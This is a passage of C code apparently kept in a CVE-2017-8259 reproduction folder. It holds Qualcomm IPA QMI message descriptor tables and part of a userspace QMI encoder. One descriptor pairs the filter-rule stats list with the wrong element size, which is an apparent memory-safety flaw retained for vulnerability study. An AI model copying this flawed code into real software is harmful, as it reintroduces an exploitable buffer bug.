		.elem_len	= 1,
		.elem_size	= sizeof(uint64_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_pipe_stats_info_type_v01,
					num_ipv6_packets),
	},
	{
		.data_type	= QMI_UNSIGNED_8_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint64_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_pipe_stats_info_type_v01,
					num_ipv6_bytes),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_stats_type_filter_rule_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct
					ipa_stats_type_filter_rule_v01,
					filter_rule_index),
	},
	{
		.data_type	= QMI_UNSIGNED_8_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint64_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct
					ipa_stats_type_filter_rule_v01,
					num_packets),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_get_data_stats_resp_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct qmi_response_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(
			struct ipa_get_data_stats_resp_msg_v01,
			resp),
		.ei_array	= get_qmi_response_type_v01_ei(),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_get_data_stats_resp_msg_v01,
			ipa_stats_type_valid),
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_get_data_stats_resp_msg_v01,
			ipa_stats_type),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_get_data_stats_resp_msg_v01,
			ul_src_pipe_stats_list_valid),
	},
	{
		.data_type	= QMI_DATA_LEN,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_get_data_stats_resp_msg_v01,
			ul_src_pipe_stats_list_len),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_MAX_PIPES_V01,
		.elem_size	= sizeof(struct ipa_pipe_stats_info_type_v01),
		.is_array	= VAR_LEN_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_get_data_stats_resp_msg_v01,
			ul_src_pipe_stats_list),
		.ei_array	= ipa_pipe_stats_info_type_data_v01_ei,
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x12,
		.offset		= offsetof(
			struct ipa_get_data_stats_resp_msg_v01,
			dl_dst_pipe_stats_list_valid),
	},
	{
		.data_type	= QMI_DATA_LEN,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x12,
		.offset		= offsetof(
			struct ipa_get_data_stats_resp_msg_v01,
			dl_dst_pipe_stats_list_len),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_MAX_PIPES_V01,
		.elem_size	= sizeof(struct ipa_pipe_stats_info_type_v01),
		.is_array	= VAR_LEN_ARRAY,
		.tlv_type	= 0x12,
		.offset		= offsetof(
			struct ipa_get_data_stats_resp_msg_v01,
			dl_dst_pipe_stats_list),
		.ei_array	= ipa_pipe_stats_info_type_data_v01_ei,
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x13,
		.offset		= offsetof(
			struct ipa_get_data_stats_resp_msg_v01,
			dl_filter_rule_stats_list_valid),
	},
	{
		.data_type	= QMI_DATA_LEN,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x13,
		.offset		= offsetof(
			struct ipa_get_data_stats_resp_msg_v01,
			dl_filter_rule_stats_list_len),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_MAX_FILTERS_V01,
		.elem_size	= sizeof(struct ipa_pipe_stats_info_type_v01),
		.is_array	= VAR_LEN_ARRAY,
		.tlv_type	= 0x13,
		.offset		= offsetof(
			struct ipa_get_data_stats_resp_msg_v01,
			dl_filter_rule_stats_list),
		.ei_array	= ipa_stats_type_filter_rule_data_v01_ei,
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_apn_data_stats_info_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct
					ipa_apn_data_stats_info_type_v01,
					mux_id),
	},
	{
		.data_type	= QMI_UNSIGNED_8_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint64_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct
					ipa_apn_data_stats_info_type_v01,
					num_ul_packets),
	},
	{
		.data_type	= QMI_UNSIGNED_8_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint64_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct
					ipa_apn_data_stats_info_type_v01,
					num_ul_bytes),
	},
	{
		.data_type	= QMI_UNSIGNED_8_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint64_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct
					ipa_apn_data_stats_info_type_v01,
					num_dl_packets),
	},
	{
		.data_type	= QMI_UNSIGNED_8_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint64_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct
					ipa_apn_data_stats_info_type_v01,
					num_dl_bytes),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_get_apn_data_stats_req_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_get_apn_data_stats_req_msg_v01,
			mux_id_list_valid),
	},
	{
		.data_type	= QMI_DATA_LEN,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_get_apn_data_stats_req_msg_v01,
			mux_id_list_len),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= QMI_IPA_MAX_APN_V01,
		.elem_size	= sizeof(uint32_t),
		.is_array	= VAR_LEN_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_get_apn_data_stats_req_msg_v01,
			mux_id_list),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_get_apn_data_stats_resp_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct qmi_response_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(
			struct ipa_get_apn_data_stats_resp_msg_v01,
			resp),
		.ei_array	= get_qmi_response_type_v01_ei(),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_get_apn_data_stats_resp_msg_v01,
			apn_data_stats_list_valid),
	},
	{
		.data_type	= QMI_DATA_LEN,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_get_apn_data_stats_resp_msg_v01,
			apn_data_stats_list_len),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_MAX_APN_V01,
		.elem_size	= sizeof(struct
					ipa_apn_data_stats_info_type_v01),
		.is_array	= VAR_LEN_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_get_apn_data_stats_resp_msg_v01,
			apn_data_stats_list),
		.ei_array	= ipa_apn_data_stats_info_type_data_v01_ei,
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_data_usage_quota_info_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct
					ipa_data_usage_quota_info_type_v01,
					mux_id),
	},
	{
		.data_type	= QMI_UNSIGNED_8_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint64_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct
					ipa_data_usage_quota_info_type_v01,
					num_Mbytes),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_set_data_usage_quota_req_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_set_data_usage_quota_req_msg_v01,
			apn_quota_list_valid),
	},
	{
		.data_type	= QMI_DATA_LEN,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_set_data_usage_quota_req_msg_v01,
			apn_quota_list_len),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_MAX_APN_V01,
		.elem_size	= sizeof(struct
					ipa_data_usage_quota_info_type_v01),
		.is_array	= VAR_LEN_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_set_data_usage_quota_req_msg_v01,
			apn_quota_list),
		.ei_array	= ipa_data_usage_quota_info_type_data_v01_ei,
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_set_data_usage_quota_resp_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct qmi_response_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(
			struct ipa_set_data_usage_quota_resp_msg_v01,
			resp),
		.ei_array	= get_qmi_response_type_v01_ei(),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_data_usage_quota_reached_ind_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct
					ipa_data_usage_quota_info_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x01,
		.offset		= offsetof(
			struct ipa_data_usage_quota_reached_ind_msg_v01,
			apn),
		.ei_array	= ipa_data_usage_quota_info_type_data_v01_ei,
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_stop_data_usage_quota_req_msg_data_v01_ei[] = {
	/* ipa_stop_data_usage_quota_req_msg is empty */
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_stop_data_usage_quota_resp_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct qmi_response_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x02,
		.offset		= offsetof(
			struct ipa_stop_data_usage_quota_resp_msg_v01,
			resp),
		.ei_array	= get_qmi_response_type_v01_ei(),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

```

`CVE-2017-8259/qmi_encdec.c`:

```c
/* Copyright (c) 2012-2015, The Linux Foundation. All rights reserved.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 and
 * only version 2 as published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 */

#include "qmi_encdec.h"
#include "qmi_encdec_priv.h"
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

#define TLV_LEN_SIZE sizeof(uint16_t)
#define TLV_TYPE_SIZE sizeof(uint8_t)
#define OPTIONAL_TLV_TYPE_START 0x10

#define U8_MAX (uint8_t)~0
#define ETOOSMALL 120

#define CONFIG_QMI_ENCDEC_DEBUG 1
#ifdef CONFIG_QMI_ENCDEC_DEBUG

int min(int a, int b) {
	return (a < b) ? a : b;
}

#define qmi_encdec_dump(prefix_str, buf, buf_len) do { \
	const uint8_t *ptr = buf; \
	int i, linelen, remaining = buf_len; \
	int rowsize = 16, groupsize = 1; \
	unsigned char linebuf[256]; \
	for (i = 0; i < buf_len; i += rowsize) { \
		linelen = min(remaining, rowsize); \
		remaining -= linelen; \
		printf("%s:\n", prefix_str); \
	} \
} while (0)

#define QMI_ENCODE_LOG_MSG(buf, buf_len) do { \
	qmi_encdec_dump("QMI_ENCODE_MSG", buf, buf_len); \
} while (0)

#define QMI_DECODE_LOG_MSG(buf, buf_len) do { \
	qmi_encdec_dump("QMI_DECODE_MSG", buf, buf_len); \
} while (0)

#define QMI_ENCODE_LOG_ELEM(level, elem_len, elem_size, buf) do { \
	printf("QMI_ENCODE_ELEM lvl: %d, len: %d, size: %d\n", \
		 level, elem_len, elem_size); \
	qmi_encdec_dump("QMI_ENCODE_ELEM", buf, (elem_len * elem_size)); \
} while (0)

#define QMI_DECODE_LOG_ELEM(level, elem_len, elem_size, buf) do { \
	printf("QMI_DECODE_ELEM lvl: %d, len: %d, size: %d\n", \
		 level, elem_len, elem_size); \
	qmi_encdec_dump("QMI_DECODE_ELEM", buf, (elem_len * elem_size)); \
} while (0)

#define QMI_ENCODE_LOG_TLV(tlv_type, tlv_len) do { \
	printf("QMI_ENCODE_TLV type: %d, len: %d\n", tlv_type, tlv_len); \
} while (0)

#define QMI_DECODE_LOG_TLV(tlv_type, tlv_len) do { \
	printf("QMI_DECODE_TLV type: %d, len: %d\n", tlv_type, tlv_len); \
} while (0)

#else

#define QMI_ENCODE_LOG_MSG(buf, buf_len) { }
#define QMI_DECODE_LOG_MSG(buf, buf_len) { }
#define QMI_ENCODE_LOG_ELEM(level, elem_len, elem_size, buf) { }
#define QMI_DECODE_LOG_ELEM(level, elem_len, elem_size, buf) { }
#define QMI_ENCODE_LOG_TLV(tlv_type, tlv_len) { }
#define QMI_DECODE_LOG_TLV(tlv_type, tlv_len) { }

#endif

static int _qmi_kernel_encode(struct elem_info *ei_array,
			      void *out_buf, void *in_c_struct,
			      uint32_t out_buf_len, int enc_level);

static int _qmi_kernel_decode(struct elem_info *ei_array,
			      void *out_c_struct,
			      void *in_buf, uint32_t in_buf_len,
			      int dec_level);
static struct elem_info *skip_to_next_elem(struct elem_info *ei_array,
					   int level);

/**
 * qmi_calc_max_msg_len() - Calculate the maximum length of a QMI message
 * @ei_array: Struct info array describing the structure.
 * @level: Level to identify the depth of the nested structures.
 *
 * @return: expected maximum length of the QMI message or 0 on failure.
 */
static int qmi_calc_max_msg_len(struct elem_info *ei_array,
				int level)
{
	int max_msg_len = 0;
	struct elem_info *temp_ei;

	if (!ei_array)
		return max_msg_len;

	for (temp_ei = ei_array; temp_ei->data_type != QMI_EOTI; temp_ei++) {
		/* Flag to identify the optional element is not encoded */
		if (temp_ei->data_type == QMI_OPT_FLAG)
			continue;

		if (temp_ei->data_type == QMI_DATA_LEN) {
			max_msg_len += (temp_ei->elem_size == sizeof(uint8_t) ?
					sizeof(uint8_t) : sizeof(uint16_t));
			continue;
		} else if (temp_ei->data_type == QMI_STRUCT) {
			max_msg_len += (temp_ei->elem_len *
					qmi_calc_max_msg_len(temp_ei->ei_array,
							    (level + 1)));
		} else if (temp_ei->data_type == QMI_STRING) {
			if (level > 1)
				max_msg_len += temp_ei->elem_len <= U8_MAX ?
					sizeof(uint8_t) : sizeof(uint16_t);
			max_msg_len += temp_ei->elem_len * temp_ei->elem_size;
		} else {
			max_msg_len += (temp_ei->elem_len * temp_ei->elem_size);
		}

		/*
		 * Type & Length info. not prepended for elements in the
		 * nested structure.
		 */
		if (level == 1)
			max_msg_len += (TLV_TYPE_SIZE + TLV_LEN_SIZE);
	}
	return max_msg_len;
}

/**
 * qmi_calc_min_msg_len() - Calculate the minimum length of a QMI message
 * @ei_array: Struct info array describing the structure.
 * @level: Level to identify the depth of the nested structures.
 *
 * @return: expected minimum length of the QMI message or 0 on failure.
 */
static int qmi_calc_min_msg_len(struct elem_info *ei_array,
				int level)
{
	int min_msg_len = 0;
	struct elem_info *temp_ei = ei_array;

	if (!ei_array)
		return min_msg_len;

	while (temp_ei->data_type != QMI_EOTI) {
		/* Optional elements do not count in minimum length */
		if (temp_ei->data_type == QMI_OPT_FLAG) {
			temp_ei = skip_to_next_elem(temp_ei, level);
			continue;
		}

		if (temp_ei->data_type == QMI_DATA_LEN) {
			min_msg_len += (temp_ei->elem_size == sizeof(uint8_t) ?
					sizeof(uint8_t) : sizeof(uint16_t));
			temp_ei++;
			continue;
		} else if (temp_ei->data_type == QMI_STRUCT) {
			min_msg_len += qmi_calc_min_msg_len(temp_ei->ei_array,
							    (level + 1));
			temp_ei++;
		} else if (temp_ei->data_type == QMI_STRING) {
			if (level > 1)
				min_msg_len += temp_ei->elem_len <= U8_MAX ?
					sizeof(uint8_t) : sizeof(uint16_t);
			min_msg_len += temp_ei->elem_len * temp_ei->elem_size;
			temp_ei++;
		} else {
			min_msg_len += (temp_ei->elem_len * temp_ei->elem_size);
			temp_ei++;
		}

		/*
		 * Type & Length info. not prepended for elements in the
		 * nested structure.
		 */
		if (level == 1)
			min_msg_len += (TLV_TYPE_SIZE + TLV_LEN_SIZE);
	}
	return min_msg_len;
}

/**
 * qmi_verify_max_msg_len() - Verify the maximum length of a QMI message
 * @desc: Pointer to structure descriptor.
 *
 * @return: true if the maximum message length embedded in structure
 *          descriptor matches the calculated value, else false.
 */
bool qmi_verify_max_msg_len(struct msg_desc *desc)
{
	int calc_max_msg_len;

	if (!desc)
		return false;

	calc_max_msg_len = qmi_calc_max_msg_len(desc->ei_array, 1);
	if (calc_max_msg_len != desc->max_msg_len) {
		printf("%s: Calc. len %d != Passed len %d\n",
			__func__, calc_max_msg_len, desc->max_msg_len);
		return false;
	}
	return true;
}

/**
 * qmi_kernel_encode() - Encode to QMI message wire format
 * @desc: Pointer to structure descriptor.
 * @out_buf: Buffer to hold the encoded QMI message.
 * @out_buf_len: Length of the out buffer.
 * @in_c_struct: C Structure to be encoded.
 *
 * @return: size of encoded message on success, < 0 for error.
 */
int qmi_kernel_encode(struct msg_desc *desc,
		      void *out_buf, uint32_t out_buf_len,
		      void *in_c_struct)
{
	int enc_level = 1;
	int ret, calc_max_msg_len, calc_min_msg_len;

	if (!desc)
		return -EINVAL;

	/* Check the possibility of a zero length QMI message */
	if (!in_c_struct) {
		calc_min_msg_len = qmi_calc_min_msg_len(desc->ei_array, 1);
		if (calc_min_msg_len) {
			printf("%s: Calc. len %d != 0, but NULL in_c_struct\n",
				__func__, calc_min_msg_len);
			return -EINVAL;
		} else {
			printf("%s: ret 0\n", __func__);
			return 0;
		}
	}

	/*
	 * Not a zero-length message. Ensure the output buffer and
	 * element information array are not NULL.
	 */
	if (!out_buf || !desc->ei_array) {
		printf("%s ret error out buf ei_array\n", __func__);
		return -EINVAL;
	}

	if (desc->max_msg_len < out_buf_len) {
		printf("%s ret error max_msg_len < outbuf_len\n", __func__);
		return -ETOOSMALL;
	}
	
	ret = _qmi_kernel_encode(desc->ei_array, out_buf,
				 in_c_struct, out_buf_len, enc_level);
	if (ret == -ETOOSMALL) {
		calc_max_msg_len = qmi_calc_max_msg_len(desc->ei_array, 1);
		printf("%s: Calc. len %d != Out buf len %d\n",
			__func__, calc_max_msg_len, out_buf_len);
	}
	return ret;
}

/**
 * qmi_encode_basic_elem() - Encodes elements of basic/primary data type
 * @buf_dst: Buffer to store the encoded information.
 * @buf_src: Buffer containing the elements to be encoded.
 * @elem_len: Number of elements, in the buf_src, to be encoded.
 * @elem_size: Size of a single instance of the element to be encoded.
 *
 * @return: number of bytes of encoded information.
 *
 * This function encodes the "elem_len" number of data elements, each of
 * size "elem_size" bytes from the source buffer "buf_src" and stores the
 * encoded information in the destination buffer "buf_dst". The elements are
 * of primary data type which include uint8_t - uint64_t or similar. This
 * function returns the number of bytes of encoded information.
 */
static int qmi_encode_basic_elem(void *buf_dst, void *buf_src,
				 uint32_t elem_len, uint32_t elem_size)
{
	uint32_t i, rc = 0;

	for (i = 0; i < elem_len; i++) {
		QMI_ENCDEC_ENCODE_N_BYTES(buf_dst, buf_src, elem_size);
		rc += elem_size;
	}

	return rc;
}

/**
 * qmi_encode_struct_elem() - Encodes elements of struct data type
 * @ei_array: Struct info array descibing the struct element.
 * @buf_dst: Buffer to store the encoded information.
 * @buf_src: Buffer containing the elements to be encoded.
 * @elem_len: Number of elements, in the buf_src, to be encoded.
 * @out_buf_len: Available space in the encode buffer.
 * @enc_level: Depth of the nested structure from the main structure.
 *
 * @return: Mumber of bytes of encoded information, on success.
 *          < 0 on error.
 *
 * This function encodes the "elem_len" number of struct elements, each of
 * size "ei_array->elem_size" bytes from the source buffer "buf_src" and
 * stores the encoded information in the destination buffer "buf_dst". The
 * elements are of struct data type which includes any C structure. This
 * function returns the number of bytes of encoded information.
 */
static int qmi_encode_struct_elem(struct elem_info *ei_array,
				  void *buf_dst, void *buf_src,
				  uint32_t elem_len, uint32_t out_buf_len,
				  int enc_level)
{
	int i, rc, encoded_bytes = 0;
	struct elem_info *temp_ei = ei_array;

	for (i = 0; i < elem_len; i++) {
		rc = _qmi_kernel_encode(temp_ei->ei_array, buf_dst, buf_src,
					(out_buf_len - encoded_bytes),
					enc_level);
		if (rc < 0) {
			printf("%s: STRUCT Encode failure\n", __func__);
			return rc;
		}
		buf_dst = buf_dst + rc;
		buf_src = buf_src + temp_ei->elem_size;
		encoded_bytes += rc;
	}

	return encoded_bytes;
}

/**
 * qmi_encode_string_elem() - Encodes elements of string data type
 * @ei_array: Struct info array descibing the string element.
 * @buf_dst: Buffer to store the encoded information.
 * @buf_src: Buffer containing the elements to be encoded.
 * @out_buf_len: Available space in the encode buffer.
 * @enc_level: Depth of the string element from the main structure.
 *
 * @return: Mumber of bytes of encoded information, on success.
 *          < 0 on error.
 *
 * This function encodes a string element of maximum length "ei_array->elem_len"
 * bytes from the source buffer "buf_src" and stores the encoded information in
 * the destination buffer "buf_dst". This function returns the number of bytes
 * of encoded information.
 */
static int qmi_encode_string_elem(struct elem_info *ei_array,
				  void *buf_dst, void *buf_src,
				  uint32_t out_buf_len, int enc_level)
{
	int rc;
	int encoded_bytes = 0;
	struct elem_info *temp_ei = ei_array;
	uint32_t string_len = 0;
	uint32_t string_len_sz = 0;

	string_len = strlen(buf_src);
	string_len_sz = temp_ei->elem_len <= U8_MAX ?
			sizeof(uint8_t) : sizeof(uint16_t);
	if (string_len > temp_ei->elem_len) {
		printf("%s: String to be encoded is longer - %d > %d\n",
			__func__, string_len, temp_ei->elem_len);
		return -EINVAL;
	}

	if (enc_level == 1) {
		if (string_len + TLV_LEN_SIZE + TLV_TYPE_SIZE >
		    out_buf_len) {
			printf("%s: Output len %d > Out Buf len %d\n",
				__func__, string_len, out_buf_len);
			return -ETOOSMALL;
		}
	} else {
		if (string_len + string_len_sz > out_buf_len) {
			printf("%s: Output len %d > Out Buf len %d\n",
				__func__, string_len, out_buf_len);
			return -ETOOSMALL;
		}
		rc = qmi_encode_basic_elem(buf_dst, &string_len,
					   1, string_len_sz);
		encoded_bytes += rc;
	}

	rc = qmi_encode_basic_elem(buf_dst + encoded_bytes, buf_src,
				   string_len, temp_ei->elem_size);
	encoded_bytes += rc;
	QMI_ENCODE_LOG_ELEM(enc_level, string_len, temp_ei->elem_size, buf_src);
	return encoded_bytes;
}

/**
 * skip_to_next_elem() - Skip to next element in the structure to be encoded
 * @ei_array: Struct info describing the element to be skipped.
 * @level: Depth level of encoding/decoding to identify nested structures.
 *
 * @return: Struct info of the next element that can be encoded.
 *
 * This function is used while encoding optional elements. If the flag
 * corresponding to an optional element is not set, then encoding the
 * optional element can be skipped. This function can be used to perform
 * that operation.
 */
static struct elem_info *skip_to_next_elem(struct elem_info *ei_array,
					   int level)
{
	struct elem_info *temp_ei = ei_array;
	uint8_t tlv_type;

	if (level > 1) {
		temp_ei = temp_ei + 1;
	} else {
		do {
			tlv_type = temp_ei->tlv_type;
			temp_ei = temp_ei + 1;
		} while (tlv_type == temp_ei->tlv_type);
	}

	return temp_ei;
}

/**
 * _qmi_kernel_encode() - Core Encode Function
 * @ei_array: Struct info array describing the structure to be encoded.
 * @out_buf: Buffer to hold the encoded QMI message.
 * @in_c_struct: Pointer to the C structure to be encoded.
 * @out_buf_len: Available space in the encode buffer.
 * @enc_level: Encode level to indicate the depth of the nested structure,
 *             within the main structure, being encoded.
 *
 * @return: Number of bytes of encoded information, on success.
 *          < 0 on error.
 */
static int _qmi_kernel_encode(struct elem_info *ei_array,
			      void *out_buf, void *in_c_struct,
			      uint32_t out_buf_len, int enc_level)
{
	struct elem_info *temp_ei = ei_array;
	uint8_t opt_flag_value = 0;
	uint32_t data_len_value = 0, data_len_sz;
	uint8_t *buf_dst = (uint8_t *)out_buf;
	uint8_t *tlv_pointer;
	uint32_t tlv_len;
	uint8_t tlv_type;
	uint32_t encoded_bytes = 0;
	void *buf_src;
	int encode_tlv = 0;
	int rc;

	tlv_pointer = buf_dst;
	tlv_len = 0;
	if (enc_level == 1)
		buf_dst = buf_dst + (TLV_LEN_SIZE + TLV_TYPE_SIZE);

	while (temp_ei->data_type != QMI_EOTI) {
		buf_src = in_c_struct + temp_ei->offset;
		tlv_type = temp_ei->tlv_type;

		if (temp_ei->is_array == NO_ARRAY) {
			data_len_value = 1;
		} else if (temp_ei->is_array == STATIC_ARRAY) {
			data_len_value = temp_ei->elem_len;
		} else if (data_len_value <= 0 ||
			    temp_ei->elem_len < data_len_value) {
			printf("%s: Invalid data length\n", __func__);
			return -EINVAL;
		}

		switch (temp_ei->data_type) {
		case QMI_OPT_FLAG:
			rc = qmi_encode_basic_elem(&opt_flag_value, buf_src,
						   1, sizeof(uint8_t));
			if (opt_flag_value)
				temp_ei = temp_ei + 1;
			else
				temp_ei = skip_to_next_elem(temp_ei, enc_level);
			break;

		case QMI_DATA_LEN:
			printf("Encoding data len\n");
			memcpy(&data_len_value, buf_src, temp_ei->elem_size);
			data_len_sz = temp_ei->elem_size == sizeof(uint8_t) ?
					sizeof(uint8_t) : sizeof(uint16_t);
			/* Check to avoid out of range buffer access */
			if ((data_len_sz + encoded_bytes + TLV_LEN_SIZE +
			    TLV_TYPE_SIZE) > out_buf_len) {
				printf("%s: Too Small Buffer @DATA_LEN\n",
					__func__);
				return -ETOOSMALL;
			}
			rc = qmi_encode_basic_elem(buf_dst, &data_len_value,
						   1, data_len_sz);
			UPDATE_ENCODE_VARIABLES(temp_ei, buf_dst,
				encoded_bytes, tlv_len, encode_tlv, rc);
			if (!data_len_value)
				temp_ei = skip_to_next_elem(temp_ei, enc_level);
			else
				encode_tlv = 0;
			break;

		case QMI_UNSIGNED_1_BYTE:
		case QMI_UNSIGNED_2_BYTE:
		case QMI_UNSIGNED_4_BYTE:
		case QMI_UNSIGNED_8_BYTE:
